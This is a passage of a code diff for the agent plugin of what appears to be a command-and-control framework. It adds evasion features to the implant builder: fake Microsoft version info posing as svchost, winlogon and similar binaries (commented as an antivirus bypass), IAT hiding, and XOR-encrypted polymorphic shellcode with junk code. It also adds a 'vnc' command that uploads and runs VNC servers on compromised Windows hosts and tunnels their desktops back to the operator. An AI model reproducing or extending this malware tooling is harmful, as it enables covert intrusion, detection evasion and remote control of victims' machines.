@@ -9,6 +9,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"io/fs"
 	"math/rand/v2"
 	"net"
 	"os"
@@ -266,20 +267,20 @@ func TerminalMessageClose(terminalId int) adaptix.TaskData {
 ////// PLUGIN AGENT
 
 type GenerateConfig struct {
-	Os                 string `json:"os"`
-	Arch               string `json:"arch"`
-	Format             string `json:"format"`
-	Sleep              string `json:"sleep"`
-	Jitter             int    `json:"jitter"`
-	SvcName            string `json:"svcname"`
-	IsKillDate         bool   `json:"is_killdate"`
-	Killdate           string `json:"kill_date"`
-	Killtime           string `json:"kill_time"`
-	IsWorkingTime      bool   `json:"is_workingtime"`
-	StartTime          string `json:"start_time"`
-	EndTime            string `json:"end_time"`
+	Os            string `json:"os"`
+	Arch          string `json:"arch"`
+	Format        string `json:"format"`
+	Sleep         string `json:"sleep"`
+	Jitter        int    `json:"jitter"`
+	SvcName       string `json:"svcname"`
+	IsKillDate    bool   `json:"is_killdate"`
+	Killdate      string `json:"kill_date"`
+	Killtime      string `json:"kill_time"`
+	IsWorkingTime bool   `json:"is_workingtime"`
+	StartTime     string `json:"start_time"`
+	EndTime       string `json:"end_time"`
 	// nil / omitted in JSON → default true (no CRT: -nostdlib + IAT path). Explicit false uses MinGW CRT.
-	IatHiding *bool `json:"iat_hiding"`
+	IatHiding          *bool  `json:"iat_hiding"`
 	IsSideloading      bool   `json:"is_sideloading"`
 	SideloadingContent string `json:"sideloading_content"`
 	IconContent        string `json:"icon_content"`
@@ -386,7 +387,7 @@ func generateJunkCodeC() string {
 		"char buf[%d]; memset(buf, 0x%02x, sizeof(buf));",
 		"for(int j=0; j<%d; j++) { SwitchToThread(); }",
 	}
-	
+
 	count := rand.IntN(3) + 2
 	var lines []string
 	for i := 0; i < count; i++ {
@@ -426,10 +427,10 @@ func generateDynamicStrObfuscate(key byte) string {
 	dlls := []dllEntry{
 		{"g_ax_obf_iphlpapi", "iphlpapi"},
 		{"g_ax_obf_advapi32", "advapi32"},
-		{"g_ax_obf_msvcrt",   "msvcrt"},
-		{"g_ax_obf_ws2_32",   "ws2_32"},
-		{"g_ax_obf_wininet",  "wininet"},
-		{"g_ax_obf_winhttp",  "winhttp"},
+		{"g_ax_obf_msvcrt", "msvcrt"},
+		{"g_ax_obf_ws2_32", "ws2_32"},
+		{"g_ax_obf_wininet", "wininet"},
+		{"g_ax_obf_winhttp", "winhttp"},
 	}
 
 	var sb strings.Builder
@@ -451,16 +452,15 @@ func generateDynamicStrObfuscate(key byte) string {
 	return sb.String()
 }
 
-
 var (
 	ObjectDir_http = "objects_http"
 	ObjectDir_smb  = "objects_smb"
 	ObjectDir_tcp  = "objects_tcp"
 	ObjectDir_dns  = "objects_dns"
-	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "Connector", "crt", "Crypt", "Downloader", "Encoders", "indirect_syscall", "IndirectSyscall", "JobsController", "LdrResolve", "MainAgent", "MemorySaver", "OpsecGadget", "OpsecSleep", "OpsecThread", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
+	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "Connector", "crt", "Crypt", "Downloader", "Encoders", "IatDisguise", "indirect_syscall", "IndirectSyscall", "JobsController", "LdrResolve", "MainAgent", "MemorySaver", "OpsecGadget", "OpsecSleep", "OpsecThread", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	// Match src_beacon/Makefile COMMON_FLAGS (no global -masm=intel; no -fpermissive — Clang rejects it).
-	CFlags = "-c -Os -fno-lto -fno-unroll-loops -fno-rtti -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -falign-labels=1 -mrdrnd -fms-extensions -Wno-error=gnu-anonymous-struct -Wno-error=nested-anon-types -Wno-error=anonymous-struct -w -fPIC"
-	LFlags = "-Os -fno-lto -s -Wl,-s,--gc-sections,--no-insert-timestamp,--exclude-libs,ALL -mwindows"
+	CFlags = "-c -Os -fno-lto -fno-unroll-loops -fno-rtti -fno-unwind-tables -fno-strict-aliasing -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -falign-labels=1 -fms-extensions -Wno-error=gnu-anonymous-struct -Wno-error=nested-anon-types -Wno-error=anonymous-struct -w"
+	LFlags = "-Os -fno-lto -s -Wl,-s,--gc-sections,--exclude-libs,ALL -mwindows"
 )
 
 func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
@@ -859,6 +859,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		buildPath = tempDir + "/file.exe"
 		Filename += ".exe"
 		if iatHide {
+			postLibs += " -lkernel32"
 			Files += ObjectDir + "/entry_exe" + Ext + " "
 			lFlags += " -Wl,-T," + linkerLd
 			if generateConfig.Arch == "x86" {
@@ -872,7 +873,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		buildPath = tempDir + "/svc.exe"
 		Filename = "svc_" + Filename + ".exe"
 		if iatHide {
-			postLibs += " -ladvapi32"
+			postLibs += " -lkernel32 -ladvapi32"
 			Files += ObjectDir + "/entry_svc" + Ext + " "
 			lFlags += " -Wl,-T," + linkerLd
 			if generateConfig.Arch == "x86" {
@@ -989,6 +990,112 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		Files += resObj + " "
 	}
 
+	// Inject VERSIONINFO + RT_MANIFEST for PE legitimacy (QVM202 bypass)
+	if generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe" || generateConfig.Format == "DLL" {
+		var rsrcTag [4]byte
+		_, _ = crand.Read(rsrcTag[:])
+		rsrcBase := fmt.Sprintf("r%x", binary.BigEndian.Uint32(rsrcTag[:]))
+
+		manifestXML := "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
+			"<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n" +
+			"  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n" +
+			"    <security>\n" +
+			"      <requestedPrivileges>\n" +
+			"        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n" +
+			"      </requestedPrivileges>\n" +
+			"    </security>\n" +
+			"  </trustInfo>\n" +
+			"  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n" +
+			"    <application>\n" +
+			"      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>\n" +
+			"      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n" +
+			"      <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>\n" +
+			"      <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>\n" +
+			"    </application>\n" +
+			"  </compatibility>\n" +
+			"  <dependency>\n" +
+			"    <dependentAssembly>\n" +
+			"      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\"/>\n" +
+			"    </dependentAssembly>\n" +
+			"  </dependency>\n" +
+			"</assembly>"
+
+		manifestPath := tempDir + "/" + rsrcBase + "_manifest.xml"
+		if err := os.WriteFile(manifestPath, []byte(manifestXML), 0600); err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("manifest write: %w", err)
+		}
+
+		// Per-build randomized VERSIONINFO strings
+		vfRand := rand.Uint32()
+		vMajor := 1 + int(vfRand&3)
+		vMinor := int((vfRand>>2)&7)
+		vPatch := int((vfRand>>5)&0xFFF)
+		vBuild := int((vfRand>>17)&0x7FFF)
+
+		type viEntry struct{ company, desc, internal, orig, product string }
+		viPool := []viEntry{
+			{"Microsoft Corporation", "Host Process for Windows Services", "svchost", "svchost.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Windows Explorer", "explorer", "explorer.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Windows Command Processor", "cmd", "cmd.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Notepad", "notepad", "notepad.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Windows Logon Application", "winlogon", "winlogon.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "WMI Provider Host", "WmiPrvSE", "WmiPrvSE.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Spooler SubSystem App", "spoolsv", "spoolsv.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Windows Task Manager", "taskmgr", "taskmgr.exe", "Microsoft Windows Operating System"},
+		}
+		vi := viPool[int(vfRand>>20)%len(viPool)]
+
+		rcContent := "1 VERSIONINFO\n" +
+			fmt.Sprintf("FILEVERSION     %d,%d,%d,%d\n", vMajor, vMinor, vPatch, vBuild) +
+			fmt.Sprintf("PRODUCTVERSION  %d,%d,%d,%d\n", vMajor, vMinor, vPatch, vBuild) +
+			"FILEFLAGSMASK   0x3fL\n" +
+			"FILEFLAGS       0x0L\n" +
+			"FILEOS          0x40004L\n" +
+			"FILETYPE        0x1L\n" +
+			"FILESUBTYPE     0x0L\n" +
+			"BEGIN\n" +
+			"    BLOCK \"StringFileInfo\"\n" +
+			"    BEGIN\n" +
+			"        BLOCK \"040904B0\"\n" +
+			"        BEGIN\n" +
+			fmt.Sprintf("            VALUE \"CompanyName\", \"%s\"\n", vi.company) +
+			fmt.Sprintf("            VALUE \"FileDescription\", \"%s\"\n", vi.desc) +
+			fmt.Sprintf("            VALUE \"FileVersion\", \"%d.%d.%d.%d\"\n", vMajor, vMinor, vPatch, vBuild) +
+			fmt.Sprintf("            VALUE \"InternalName\", \"%s\"\n", vi.internal) +
+			"            VALUE \"LegalCopyright\", \"Microsoft Corporation. All rights reserved.\"\n" +
+			fmt.Sprintf("            VALUE \"OriginalFilename\", \"%s\"\n", vi.orig) +
+			fmt.Sprintf("            VALUE \"ProductName\", \"%s\"\n", vi.product) +
+			fmt.Sprintf("            VALUE \"ProductVersion\", \"%d.%d.%d.%d\"\n", vMajor, vMinor, vPatch, vBuild) +
+			"        END\n" +
+			"    END\n" +
+			"    BLOCK \"VarFileInfo\"\n" +
+			"    BEGIN\n" +
+			"        VALUE \"Translation\", 0x409, 1200\n" +
+			"    END\n" +
+			"END\n" +
+			"\n" +
+			"1 24 \"" + rsrcBase + "_manifest.xml\"\n"
+
+		rcPath := tempDir + "/" + rsrcBase + ".rc"
+		rsrcObj := tempDir + "/" + rsrcBase + ".o"
+		if err := os.WriteFile(rcPath, []byte(rcContent), 0600); err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("resource rc write: %w", err)
+		}
+
+		windres := "x86_64-w64-mingw32-windres"
+		if generateConfig.Arch == "x86" {
+			windres = "i686-w64-mingw32-windres"
+		}
+		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling PE resources (windres)...")
+		if err := Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, windres, "-O", "coff", "-i", rsrcBase+".rc", "-o", rsrcBase+".o"); err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("windres: %w", err)
+		}
+		Files += rsrcObj + " "
+	}
+
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Output format: %s, Filename: %s", generateConfig.Format, Filename))
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Linking payload...")
 
@@ -1003,9 +1110,9 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	if artifactSource != "" {
 		// 1. Generate unique seed and comprehensive dynamic header for Core Beacon Obfuscation
 		coreSeed := fmt.Sprintf("0x%x", rand.Uint32())
-		
+
 		symbols := []string{
-			"AgentMain", "AgentExit", "ApiLoad", "Agent_Create", "Agent_Initialize", 
+			"AgentMain", "AgentExit", "ApiLoad", "Agent_Create", "Agent_Initialize",
 			"Agent_BuildBeat", "Agent_IsActive", "Agent_GetWorkingSleep", "Agent_SetSessionKey",
 			"Boffer_Initialize", "Boffer_ProcessAsyncBofs", "Downloader_ProcessDownloader",
 			"JobsController_ProcessJobs", "Proxyfire_ProcessTunnels", "Pivotter_ProcessPivots",
@@ -1016,7 +1123,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		var header strings.Builder
 		header.WriteString("#pragma once\n")
 		header.WriteString(fmt.Sprintf("// Seed: %s\n\n", coreSeed))
-		
+
 		// Symbol Obfuscation
 		for _, sym := range symbols {
 			header.WriteString(fmt.Sprintf("#define %s Ax_%s\n", sym, generateRandomString(12)))
@@ -1092,7 +1199,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 			_ = os.RemoveAll(tempDir)
 			return nil, "", fmt.Errorf("failed to generate polymorphic beacon shellcode (Seed: %s): %w", coreSeed, err)
 		}
-		
+
 		// Read the generated bin
 		binName := "beacon_http.x64.bin"
 		if generateConfig.Arch == "x86" {
@@ -1108,13 +1215,13 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 			_ = os.RemoveAll(tempDir)
 			return nil, "", fmt.Errorf("failed to read shellcode bin: %w", err)
 		}
-		
+
 		// XOR encrypt shellcode for loader
 		xorKey := byte(rand.Uint32())
 		for i := 0; i < len(rawShellcode); i++ {
 			rawShellcode[i] ^= xorKey
 		}
-		
+
 		// Format shellcode as hex for Go template
 		var hexBuffer strings.Builder
 		for i, b := range rawShellcode {
@@ -1123,61 +1230,61 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 				hexBuffer.WriteString(", ")
 			}
 		}
-		
+
 		// Read and process template
 		tmplContent, err := os.ReadFile(artifactSource)
 		if err != nil {
 			_ = os.RemoveAll(tempDir)
 			return nil, "", err
 		}
-		
+
 		isGoArtifact := strings.HasSuffix(artifactSource, ".go")
-		
+
 		processed := strings.ReplaceAll(string(tmplContent), "{{.Shellcode}}", hexBuffer.String())
 		processed = strings.ReplaceAll(processed, "{{.XorKey}}", fmt.Sprintf("0x%02x", xorKey))
-		
+
 		// Symbol and Code Polymorphism
 		processed = strings.ReplaceAll(processed, "{{.VarShellcode}}", generateRandomString(rand.IntN(5)+8))
 		processed = strings.ReplaceAll(processed, "{{.VarKey}}", generateRandomString(rand.IntN(5)+8))
 		processed = strings.ReplaceAll(processed, "{{.VarAddr}}", generateRandomString(rand.IntN(5)+8))
 		processed = strings.ReplaceAll(processed, "{{.VarThread}}", generateRandomString(rand.IntN(5)+8))
 		processed = strings.ReplaceAll(processed, "{{.FuncExec}}", "Ax_"+generateRandomString(10))
-		
+
 		if !isGoArtifact {
 			processed = strings.ReplaceAll(processed, "{{.JunkCode}}", generateJunkCodeC())
 			processed = strings.ReplaceAll(processed, "{{.JunkFunctions}}", generateJunkFunctionsC())
 		}
-		
+
 		tempSource := tempDir + "/main.go"
 		if !isGoArtifact {
 			tempSource = tempDir + "/main.cpp"
 		}
-		
+
 		if err := os.WriteFile(tempSource, []byte(processed), 0600); err != nil {
 			_ = os.RemoveAll(tempDir)
 			return nil, "", err
 		}
-		
+
 		// Compile Artifact
 		if isGoArtifact {
 			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling Go artifact...")
 			err = Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, "go", "build", "-trimpath", "-ldflags", "-s -w -H=windowsgui", "-o", buildPath, "main.go")
 		} else {
 			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling C++ artifact...")
-			
+
 			// Compiler Flag Jitter (Randomize optimization level)
 			optFlags := []string{"-Os", "-O1", "-O2", "-O3"}
 			selectedOpt := optFlags[rand.IntN(len(optFlags))]
-			
+
 			isDll := strings.Contains(generateConfig.Format, "DLL")
 			artifactArgs := []string{targetFlag}
 			if isDll {
 				artifactArgs = append(artifactArgs, "-shared")
 			} else {
-				artifactArgs = append(artifactArgs, "-mwindows") 
+				artifactArgs = append(artifactArgs, "-mwindows")
 			}
 			artifactArgs = append(artifactArgs, selectedOpt, "-s", "-o", buildPath, "main.cpp", "-luser32", "-lkernel32")
-			
+
 			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Optimization: %s", selectedOpt))
 			err = Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, Compiler, artifactArgs...)
 		}
@@ -1186,7 +1293,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 			_ = os.RemoveAll(tempDir)
 			return nil, "", fmt.Errorf("artifact build failed: %w", err)
 		}
-		
+
 	} else {
 		err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, Compiler, buildArgs...)
 		if err != nil {
@@ -1391,6 +1498,205 @@ func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.Ta
 	}
 
 	return taskData, err
+}
+
+func resolveVncAgentDir() (string, error) {
+	candidates := []string{
+		filepath.Join(filepath.Dir(ModuleDir), "vnc", "agent"),
+		filepath.Join(filepath.Dir(ModuleDir), "vnc", "dist", "agent"),
+		filepath.Join(filepath.Dir(filepath.Dir(ModuleDir)), "vnc", "agent"),
+		filepath.Join(filepath.Dir(filepath.Dir(ModuleDir)), "vnc", "dist", "agent"),
+	}
+
+	for _, candidate := range candidates {
+		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
+			return candidate, nil
+		}
+	}
+
+	return "", fmt.Errorf("vnc agent payload directory not found")
+}
+
+func vncStreamBinaryForBeacon(agentData adaptix.AgentData) (string, string, string, error) {
+	if agentData.Os != adaptix.OS_WINDOWS {
+		return "", "", "", fmt.Errorf("vnc auto-start is only supported for Windows beacon agents")
+	}
+
+	vncAgentDir, err := resolveVncAgentDir()
+	if err != nil {
+		return "", "", "", err
+	}
+	remotePath := fmt.Sprintf("C:\\Windows\\Temp\\adaptix_vnc_%s_%08x.exe", agentData.Id, rand.Uint32())
+	runCommand := fmt.Sprintf("\"%s\" --port", remotePath)
+	return filepath.Join(vncAgentDir, "vnc_stream.exe"), remotePath, runCommand, nil
+}
+
+type nativeVncPayloadFile struct {
+	LocalPath  string
+	RemotePath string
+}
+
+type nativeVncPayload struct {
+	Files      []nativeVncPayloadFile
+	RemoteDirs []string
+	RemoteDir  string
+	RunCommand string
+}
+
+func windowsRemoteJoin(base string, rel string) string {
+	rel = filepath.ToSlash(rel)
+	rel = strings.Trim(rel, "/")
+	if rel == "." || rel == "" {
+		return base
+	}
+	return base + "\\" + strings.ReplaceAll(rel, "/", "\\")
+}
+
+func shouldDeployNativeVncFile(name string) bool {
+	name = strings.ToLower(name)
+	if name == "vncconfig.exe" {
+		return false
+	}
+	switch filepath.Ext(name) {
+	case ".md", ".rst", ".txt":
+		return false
+	default:
+		return true
+	}
+}
+
+func resolveNativeVncPayload(agentData adaptix.AgentData, targetPort int) (nativeVncPayload, error) {
+	var payload nativeVncPayload
+	if agentData.Os != adaptix.OS_WINDOWS {
+		return payload, fmt.Errorf("native VNC auto-start is only supported for Windows beacon agents")
+	}
+
+	vncAgentDir, err := resolveVncAgentDir()
+	if err != nil {
+		return payload, err
+	}
+
+	candidates := []string{
+		filepath.Join(vncAgentDir, "native", "windows"),
+		filepath.Join(vncAgentDir, "winvnc"),
+	}
+	var payloadDir string
+	for _, candidate := range candidates {
+		if info, statErr := os.Stat(candidate); statErr == nil && info.IsDir() {
+			payloadDir = candidate
+			break
+		}
+	}
+	if payloadDir == "" {
+		return payload, fmt.Errorf("native VNC payload directory not found; place winvnc.exe and support files under %s", filepath.Join(vncAgentDir, "native", "windows"))
+	}
+
+	payload.RemoteDir = fmt.Sprintf("C:\\Windows\\Temp\\adaptix_vnc_native_%s_%08x", agentData.Id, rand.Uint32())
+	remoteDirSet := map[string]struct{}{payload.RemoteDir: {}}
+	var preferredExe string
+	var fallbackExe string
+	var startScript string
+
+	err = filepath.WalkDir(payloadDir, func(path string, entry fs.DirEntry, walkErr error) error {
+		if walkErr != nil {
+			return walkErr
+		}
+		if path == payloadDir {
+			return nil
+		}
+
+		rel, relErr := filepath.Rel(payloadDir, path)
+		if relErr != nil {
+			return relErr
+		}
+		remotePath := windowsRemoteJoin(payload.RemoteDir, rel)
+
+		if entry.IsDir() {
+			remoteDirSet[remotePath] = struct{}{}
+			return nil
+		}
+
+		if !shouldDeployNativeVncFile(entry.Name()) {
+			return nil
+		}
+
+		payload.Files = append(payload.Files, nativeVncPayloadFile{
+			LocalPath:  path,
+			RemotePath: remotePath,
+		})
+
+		name := strings.ToLower(entry.Name())
+		if name == "adaptix_start.bat" || name == "adaptix_start.cmd" {
+			startScript = remotePath
+		}
+		if strings.HasSuffix(name, ".exe") {
+			if fallbackExe == "" {
+				fallbackExe = remotePath
+			}
+			if name == "winvnc.exe" || name == "winvnc4.exe" || strings.Contains(name, "winvnc") {
+				preferredExe = remotePath
+			}
+		}
+		return nil
+	})
+	if err != nil {
+		return payload, err
+	}
+	if len(payload.Files) == 0 {
+		return payload, fmt.Errorf("native VNC payload directory is empty: %s", payloadDir)
+	}
+
+	for dir := range remoteDirSet {
+		payload.RemoteDirs = append(payload.RemoteDirs, dir)
+	}
+	sort.Strings(payload.RemoteDirs)
+
+	if startScript != "" {
+		payload.RunCommand = fmt.Sprintf("cmd.exe /c \"\"%s\" %d\"", startScript, targetPort)
+		return payload, nil
+	}
+
+	remoteExe := preferredExe
+	if remoteExe == "" {
+		remoteExe = fallbackExe
+	}
+	if remoteExe == "" {
+		return payload, fmt.Errorf("native VNC payload must include adaptix_start.bat/cmd or a VNC server exe")
+	}
+
+	if strings.Contains(strings.ToLower(filepath.Base(remoteExe)), "winvnc") {
+		payload.RunCommand = fmt.Sprintf("\"%s\" -run", remoteExe)
+	} else {
+		payload.RunCommand = fmt.Sprintf("\"%s\"", remoteExe)
+	}
+	return payload, nil
+}
+
+func queueBeaconUpload(agentData adaptix.AgentData, remotePath string, fileContent []byte) {
+	memoryId := CreateTaskCommandSaveMemory(Ts, agentData.Id, fileContent)
+	array := []interface{}{COMMAND_UPLOAD, memoryId, Ts.TsConvertUTF8toCp(remotePath, agentData.ACP)}
+
+	taskData := adaptix.TaskData{
+		Type:    adaptix.TASK_TYPE_TASK,
+		AgentId: agentData.Id,
+		Sync:    false,
+		TaskId:  fmt.Sprintf("%08x", rand.Uint32()),
+	}
+	taskData.Data, _ = PackArray(array)
+	Ts.TsTaskCreate(agentData.Id, "", "", taskData)
+}
+
+func queueBeaconMkdir(agentData adaptix.AgentData, remotePath string) {
+	array := []interface{}{COMMAND_MKDIR, Ts.TsConvertUTF8toCp(remotePath, agentData.ACP)}
+
+	taskData := adaptix.TaskData{
+		Type:    adaptix.TASK_TYPE_TASK,
+		AgentId: agentData.Id,
+		Sync:    false,
+		TaskId:  fmt.Sprintf("%08x", rand.Uint32()),
+	}
+	taskData.Data, _ = PackArray(array)
+	Ts.TsTaskCreate(agentData.Id, "", "", taskData)
 }
 
 func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
@@ -2026,6 +2332,171 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 		memoryId := CreateTaskCommandSaveMemory(Ts, agentData.Id, fileContent)
 
 		array = []interface{}{COMMAND_UPLOAD, memoryId, Ts.TsConvertUTF8toCp(fileName, agentData.ACP)}
+	case "vnc":
+		taskData.Type = adaptix.TASK_TYPE_TUNNEL
+
+		if subcommand == "start" {
+			targetPortNumber, err1 := getFloatArg(args, "target_port")
+			localPortNumber, err2 := getFloatArg(args, "local_port")
+			if err1 != nil || err2 != nil {
+				err = errors.New("usage: vnc start <target_port> <local_port>")
+				goto RET
+			}
+			targetPort := int(targetPortNumber)
+			localPort := int(localPortNumber)
+			if targetPort < 1 || targetPort > 65535 || localPort < 1 || localPort > 65535 {
+				err = errors.New("port must be from 1 to 65535")
+				goto RET
+			}
+
+			var localBinary string
+			var remotePath string
+			var runCommandPrefix string
+			localBinary, remotePath, runCommandPrefix, err = vncStreamBinaryForBeacon(agentData)
+			if err != nil {
+				goto RET
+			}
+
+			var vncBinary []byte
+			vncBinary, err = os.ReadFile(localBinary)
+			if err != nil {
+				err = fmt.Errorf("failed to read vnc stream binary %s: %w", localBinary, err)
+				goto RET
+			}
+
+			tunnelId, e := Ts.TsTunnelCreateLportfwd(agentData.Id, "VNC Desktop", "0.0.0.0", localPort, "127.0.0.1", targetPort)
+			if e != nil {
+				err = e
+				goto RET
+			}
+			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
+			if err != nil {
+				goto RET
+			}
+
+			queueBeaconUpload(agentData, remotePath, vncBinary)
+
+			taskData.Type = adaptix.TASK_TYPE_JOB
+			runCommand := fmt.Sprintf("%s %d --quality 75 --no-detach", runCommandPrefix, targetPort)
+			array = []interface{}{COMMAND_PS_RUN, false, false, 0, Ts.TsConvertUTF8toCp(runCommand, agentData.ACP)}
+
+			taskData.Message = fmt.Sprintf("VNC auto-start queued: upload %s, run on agent port %d, tunnel local port %d. Open /vnc/viewer?local=%d after the run task starts.", remotePath, targetPort, localPort, localPort)
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
+			taskData.ClearText = "\n"
+
+		} else if subcommand == "native" {
+			targetPortNumber, err1 := getFloatArg(args, "target_port")
+			localPortNumber, err2 := getFloatArg(args, "local_port")
+			if err1 != nil || err2 != nil {
+				err = errors.New("usage: vnc native <target_port> <local_port>")
+				goto RET
+			}
+			targetPort := int(targetPortNumber)
+			localPort := int(localPortNumber)
+			if targetPort < 1 || targetPort > 65535 || localPort < 1 || localPort > 65535 {
+				err = errors.New("port must be from 1 to 65535")
+				goto RET
+			}
+
+			tunnelId, e := Ts.TsTunnelCreateLportfwd(agentData.Id, "Native VNC Desktop", "0.0.0.0", localPort, "127.0.0.1", targetPort)
+			if e != nil {
+				err = e
+				goto RET
+			}
+			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
+			if err != nil {
+				goto RET
+			}
+
+			taskData.Message = fmt.Sprintf("Native VNC tunnel started: teamserver port %d -> agent 127.0.0.1:%d. Open the Tunnels tab and use Open VNC viewer.", localPort, targetPort)
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
+			taskData.ClearText = "\n"
+
+		} else if subcommand == "deploy" {
+			targetPortNumber, err1 := getFloatArg(args, "target_port")
+			localPortNumber, err2 := getFloatArg(args, "local_port")
+			if err1 != nil || err2 != nil {
+				err = errors.New("usage: vnc deploy <target_port> <local_port>")
+				goto RET
+			}
+			targetPort := int(targetPortNumber)
+			localPort := int(localPortNumber)
+			if targetPort < 1 || targetPort > 65535 || localPort < 1 || localPort > 65535 {
+				err = errors.New("port must be from 1 to 65535")
+				goto RET
+			}
+
+			var payload nativeVncPayload
+			payload, err = resolveNativeVncPayload(agentData, targetPort)
+			if err != nil {
+				goto RET
+			}
+
+			fileContents := make([][]byte, len(payload.Files))
+			for i, payloadFile := range payload.Files {
+				fileContents[i], err = os.ReadFile(payloadFile.LocalPath)
+				if err != nil {
+					err = fmt.Errorf("failed to read native VNC payload %s: %w", payloadFile.LocalPath, err)
+					goto RET
+				}
+			}
+
+			tunnelId, e := Ts.TsTunnelCreateLportfwd(agentData.Id, "Native VNC Desktop", "0.0.0.0", localPort, "127.0.0.1", targetPort)
+			if e != nil {
+				err = e
+				goto RET
+			}
+			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
+			if err != nil {
+				goto RET
+			}
+
+			for _, remoteDir := range payload.RemoteDirs {
+				queueBeaconMkdir(agentData, remoteDir)
+			}
+			for i, payloadFile := range payload.Files {
+				queueBeaconUpload(agentData, payloadFile.RemotePath, fileContents[i])
+			}
+
+			taskData.Type = adaptix.TASK_TYPE_JOB
+			array = []interface{}{COMMAND_PS_RUN, false, false, 0, Ts.TsConvertUTF8toCp(payload.RunCommand, agentData.ACP)}
+
+			taskData.Message = fmt.Sprintf("Native VNC auto-start queued: upload %d file(s) to %s, run on agent port %d, tunnel local port %d. The client viewer opens automatically when the tunnel syncs.", len(payload.Files), payload.RemoteDir, targetPort, localPort)
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
+			taskData.ClearText = "\n"
+
+		} else if subcommand == "stop" {
+			portNumber, e := getFloatArg(args, "local_port")
+			if e != nil {
+				err = errors.New("usage: vnc stop <local_port>")
+				goto RET
+			}
+			localPort := int(portNumber)
+			Ts.TsTunnelStopLportfwd(agentData.Id, localPort)
+
+			taskData.Message = fmt.Sprintf("VNC session on port %d stopped", localPort)
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
+			taskData.ClearText = "\n"
+
+		} else if subcommand == "view" {
+			portNumber, e := getFloatArg(args, "local_port")
+			if e != nil {
+				portNumber = 41484
+			}
+			localPort := int(portNumber)
